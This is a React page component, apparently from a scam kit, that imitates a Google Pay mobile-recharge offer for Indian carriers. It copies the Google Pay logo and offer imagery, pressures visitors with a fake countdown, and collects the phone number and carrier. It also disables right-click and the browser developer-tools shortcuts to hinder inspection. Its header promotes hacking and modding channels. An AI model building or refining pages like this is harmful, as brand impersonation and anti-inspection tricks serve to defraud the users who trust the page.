// 👽follow on Github : https://github.com/GoutamHX
// 👾Follow on telegram for Hacking or modding: https://t.me/MAXX_MODS, https://t.me/TheAdvanceBots


import React, { useEffect, useState } from 'react';
import { RiMenuFill } from "react-icons/ri";
import { FaUserCircle } from "react-icons/fa";
import { useNavigate } from 'react-router-dom';
import img from '../img/footerImg.png'
const Home = () => {
  useEffect(() => {
    // Disable Right-click
    const handleRightClick = (e) => {
      e.preventDefault();

    };
// Block common Developer Tools shortcuts (F12, Ctrl+Shift+I)
const handleKeyDown = (e) => {
if (
  (e.key === 'F12') || 
  (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J'))
) {
  e.preventDefault();
 
}
};    
 // Add event listeners
 document.addEventListener('contextmenu', handleRightClick);
 document.addEventListener('keydown', handleKeyDown);

 // Cleanup event listeners when the component is unmounted
 return () => {
   document.removeEventListener('contextmenu', handleRightClick);
   document.removeEventListener('keydown', handleKeyDown);
 };
}, []);
    const [time, setTime] = useState(30 * 60); // 15 minutes in seconds
    const [mobileNumber, setMobileNumber] = useState(''); // Start with an empty string
    const [sim, setSim] = useState('Jio');
    const [msg, setMsg] = useState('');
    const navigate = useNavigate();

    const handleRecharge = () => {
        navigate('/recharge', { 
            state: { 
                mobileNumber, 
                sim: sim || null // or selectedSim || ''
            } 
        });
    }
    
    useEffect(() => {
      const intervalId = setInterval(() => {
        setTime((prevTime) => {
          if (prevTime <= 0) {
            clearInterval(intervalId);
            return 0;
          }
          return prevTime - 1;
        });
      }, 1000);
  
      return () => clearInterval(intervalId);
    }, []);
    const handleMob = () => {
      const mobileNumberRegex = /^[6-9]\d{9}$/; // Regex for Indian mobile number
  
      // Validate input against the regex
      if (mobileNumberRegex.test(mobileNumber) || mobileNumber === ''&&mobileNumber.length <= 10) { 
          setMsg(''); // Clear error message if valid or empty
          handleRecharge()
      }
      else{
        setMsg('Invalid Mobile Number');
      }
  };
  
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
  return (
    <div>
     <nav className="navbar navbar-light ">
      <div className="container-fluid">
        <div className="d-flex align-items-center">
          <RiMenuFill  className="text-primary me-3" size={25} />
          <svg viewBox="0 0 356.44 141.39000000000001" xmlns="http://www.w3.org/2000/svg" width="65">
          <g fill="#5f6368"><path d="M168.58 20.77V56.5h22.04c5.25 0 9.59-1.76 13.02-5.29 3.53-3.52 5.29-7.72 5.29-12.58s-1.76-8.91-5.29-12.44c-3.44-3.62-7.78-5.43-13.02-5.43h-22.04zm0 48.32v41.45h-13.16V8.19h34.91c8.87 0 16.39 2.96 22.6 8.86 6.31 5.9 9.45 13.1 9.45 21.58s-3.14 15.92-9.45 21.72c-6.1 5.82-13.64 8.72-22.6 8.72h-21.75zM235.68 89.08c0 3.44 1.45 6.29 4.37 8.58 2.91 2.28 6.32 3.43 10.23 3.43 5.54 0 10.46-2.05 14.8-6.14 4.34-4.1 6.51-8.91 6.51-14.43-4.1-3.25-9.83-4.86-17.17-4.86-5.34 0-9.8 1.29-13.37 3.86s-5.37 5.75-5.37 9.56m17.03-50.88c9.73 0 17.41 2.59 23.04 7.79s8.43 12.31 8.43 21.36v43.17h-12.59v-9.72h-.57c-5.44 8-12.68 12-21.74 12-7.73 0-14.2-2.28-19.39-6.85-5.2-4.58-7.8-10.29-7.8-17.16 0-7.24 2.73-13 8.22-17.28 5.49-4.29 12.81-6.43 21.96-6.43 7.82 0 14.26 1.43 19.31 4.29v-3c0-4.57-1.81-8.45-5.43-11.64-3.63-3.2-7.86-4.79-12.73-4.79-7.35 0-13.16 3.09-17.45 9.29l-11.6-7.29c6.4-9.15 15.84-13.72 28.34-13.72M356.44 40.49l-43.93 100.9h-13.59l16.31-35.3-28.9-65.6h14.31l20.89 50.31h.28l20.32-50.31z"/>
          </g><path d="M115.39 60.14c0-4.14-.35-8.14-1.01-11.96H58.86v22.65h31.79c-1.36 7.38-5.49 13.66-11.75 17.87v14.71h18.98c11.11-10.24 17.51-25.37 17.51-43.26" fill="#4285f4"/>
          <path d="M58.86 117.61c15.89 0 29.26-5.21 39.02-14.2L78.9 88.7c-5.28 3.55-12.08 5.63-20.04 5.63-15.35 0-28.38-10.34-33.05-24.27H6.27v15.15c9.69 19.21 29.6 32.41 52.6 32.41" fill="#34a853"/>
          <path d="M25.82 70.05c-1.19-3.55-1.85-7.34-1.85-11.25s.65-7.7 1.85-11.25V32.4H6.27C2.26 40.34 0 49.3 0 58.8s2.26 18.47 6.27 26.4z" fill="#fabb05"/>
          <path d="M58.86 23.27c8.67 0 16.45 2.98 22.58 8.82s16.8-16.78 16.8-16.78C88.04 5.83 74.74 0 58.86 0 35.87 0 15.96 13.19 6.27 32.4l19.55 15.15c4.66-13.93 17.69-24.27 33.05-24.27" fill="#e94235"/></svg>
        </div>
        <div className="navbar-text text-primary">
        <FaUserCircle size={30} />
        </div>
      </div>
    </nav>
<div>
    <div className="container-fluid p-0">
    <div className="d-flex align-items-center justify-content-center">
  <div className="position-relative w-100" style={{ paddingTop: '56.25%' }}>
    <img 
      src="https://couponswala.com/blog/wp-content/uploads/2020/10/Google-Pay-Recharge-Offer.png.webp" 
      alt="Google Pay Recharge Offer" 
      className="position-absolute top-0 start-0 w-100 h-100 object-fit-cover"
    />
  </div>
</div>

</div>
<div className="d-flex align-items-center justify-content-center py-1 px-4 mt-2 bg-light text-muted small">
      <div className="me-2">Special Offer Ends In:</div>
      <div className="d-flex align-items-center">
        <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" className="me-1" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
          <path d="M256,8C119,8,8,119,8,256S119,504,256,504,504,393,504,256,393,8,256,8Zm92.49,313h0l-20,25a16,16,0,0,1-22.49,2.5h0l-67-49.72a40,40,0,0,1-15-31.23V112a16,16,0,0,1,16-16h32a16,16,0,0,1,16,16V256l58,42.5A16,16,0,0,1,348.49,321Z" />
        </svg>
        {String(minutes).padStart(2, '0')}:{String(seconds).padStart(2, '0')}
      </div>
    </div>

<div className="bg-white border rounded p-4 shadow ">
  <div className="text-primary d-flex align-items-center fs-5 fw-bold mx-auto mb-4 w-fit ">
    <svg stroke="currentColor" fill="currentColor" strokeWidth={0} viewBox="0 0 24 24" height={30} width={30} xmlns="http://www.w3.org/2000/svg">
      <path d="M6 2H18C18.5523 2 19 2.44772 19 3V21C19 21.5523 18.5523 22 18 22H6C5.44772 22 5 21.5523 5 21V3C5 2.44772 5.44772 2 6 2ZM12 17C11.4477 17 11 17.4477 11 18C11 18.5523 11.4477 19 12 19C12.5523 19 13 18.5523 13 18C13 17.4477 12.5523 17 12 17Z" />
    </svg>
    <span className="ms-2">Mobile Recharge </span>
  </div>
  <label className="form-label small fw-bold mt-3">Select Network Provider</label>
                <div className="mt-2 d-flex justify-content-between text-primary small fw-bold">
                    <div className="border border-primary rounded px-2 py-1">
                        <input type="radio" id="jio" name="sim" className="me-1" defaultChecked onChange={() => setSim('Jio')} />
                        <label htmlFor="jio">Jio</label>
                    </div>
                    <div className="border border-primary rounded px-2 py-1">
                        <input type="radio" id="airtel" name="sim" className="me-1"  onChange={() => setSim('Airtel')}/>
                        <label htmlFor="airtel">Airtel</label>
                    </div>
                    <div className="border border-primary rounded px-2 py-1">
                        <input type="radio" id="vi" name="sim" className="me-1" onChange={() => setSim('VI')}/>
                        <label htmlFor="vi">VI</label>
                    </div>
                    <div className="border border-primary rounded px-2 py-1">
                        <input type="radio" id="bsnl" name="sim" className="me-1"  onChange={() => setSim('Bsnl')} />
                        <label htmlFor="bsnl">BSNL</label>
                    </div>
                </div>
  <div className="mt-3">
    <label className="form-label small fw-bold">Mobile Number</label>
    <input 
  type="number" 
  placeholder="+91 xxxxx xxxxx" 
  className="form-control" 
  // value={mobileNumber} 
  // onChange={(e) => handleMob(e)} // Use onChange to capture input
  onChange={(e)=>setMobileNumber(e.target.value)} // Use onChange to capture input
  required 
/>
<div className='text-danger text-start'>{
  msg
}</div>

  </div>
        <div className="mt-4">
        <button 
        className="btn btn-primary w-100 py-3 fw-bold" 
        onClick={handleMob} 
        disabled={mobileNumber.length !== 10} >
    Recharge
 </button>
  </div>
</div>
<div className="bg-dark py-1 mt-4">
  <div className="">
    <div className="d-flex justify-content-center align-items-center">
      <div className="position-relative" style={{ width: '100%', maxWidth: '1200px', height: 'auto' }}>

        <img 
          src={img} 
          alt="Diwali Festival" 
          className="img-fluid"  // Bootstrap's img-fluid class makes image responsive
          style={{ width: '100%', maxHeight: '300px', objectFit: 'contain' }} // Manage image size and object fit
        />
      </div>
    </div>
  </div>
</div>




</div>
</div>
  );
};

export default Home;
